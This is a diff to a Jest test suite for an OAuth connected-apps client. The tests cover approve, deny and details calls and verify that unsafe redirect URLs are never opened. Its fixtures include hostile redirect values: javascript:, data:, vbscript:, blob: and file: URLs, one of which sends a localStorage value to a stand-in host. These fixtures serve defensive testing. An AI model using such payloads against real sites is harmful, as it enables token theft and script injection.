@@ -3503,10 +3503,66 @@ describe('connected apps', () => {
       expect(await make().apps[how](ID)).toEqual({ ok: true, url: 'https://claude.ai/cb?x=1' });
       expect(oauth[fn]).toHaveBeenCalledWith(ID, { skipBrowserRedirect: true });
       expect(assign).toHaveBeenCalledWith('https://claude.ai/cb?x=1');
-      oauth[fn].mockResolvedValueOnce({ data: null, error: { status: 400 } });
+      oauth[fn].mockResolvedValueOnce({
+        data: { redirect_url: 'cursor://anysphere.cursor-retrieval/cb?code=x' },
+        error: null
+      });
+      expect(await make().apps[how](ID)).toEqual({
+        ok: true,
+        url: 'cursor://anysphere.cursor-retrieval/cb?code=x'
+      });
+      expect(assign).toHaveBeenLastCalledWith('cursor://anysphere.cursor-retrieval/cb?code=x');
+      oauth[fn].mockResolvedValueOnce({ data: null, error: { status: 500 } });
+      expect(await make().apps[how](ID)).toEqual({ ok: false });
+      oauth[fn].mockResolvedValueOnce({ data: null, error: null });
       expect(await make().apps[how](ID)).toEqual({ ok: false });
       oauth[fn].mockRejectedValueOnce(new Error('offline'));
       expect(await make().apps[how](ID)).toEqual({ ok: false });
+    }
+  );
+
+  it.each(['approve', 'deny'] as const)(
+    '%s of an expired or answered request reads as gone, which no retry fixes',
+    async (how) => {
+      const fn = how === 'approve' ? 'approveAuthorization' : 'denyAuthorization';
+      oauth[fn].mockResolvedValueOnce({
+        data: null,
+        error: { status: 400, code: 'validation_failed' }
+      });
+      expect(await make().apps[how](ID)).toEqual({ ok: true, gone: true });
+      oauth[fn].mockResolvedValueOnce({ data: null, error: { status: 401 } });
+      expect(await make().apps[how](ID)).toEqual({ ok: false });
+    }
+  );
+
+  it.each([
+    'javascript:fetch("//x?"+localStorage.getItem("k"))//?code=x',
+    ' JavaScript:alert(1)?error=access_denied',
+    'data:text/html,<script>alert(1)</script>?code=x',
+    'vbscript:msgbox(1)?code=x',
+    'blob:https://example.org/uuid?code=x',
+    'file:///C:/x?code=x',
+    'not a url'
+  ])(
+    'refuses to open the redirect %j on approve, deny and an answered request',
+    async (url) => {
+      const assign = leaving();
+      oauth.approveAuthorization.mockResolvedValueOnce({
+        data: { redirect_url: url },
+        error: null
+      });
+      expect(await make().apps.approve(ID)).toEqual({ ok: true, gone: true });
+      oauth.denyAuthorization.mockResolvedValueOnce({
+        data: { redirect_url: url },
+        error: null
+      });
+      expect(await make().apps.deny(ID)).toEqual({ ok: true, gone: true });
+      oauth.getAuthorizationDetails.mockResolvedValueOnce({
+        data: { redirect_url: url },
+        error: null
+      });
+      expect(await make().apps.details(ID)).toEqual({ ok: true, gone: true });
+      expect(assign).not.toHaveBeenCalled();
     }
   );
 
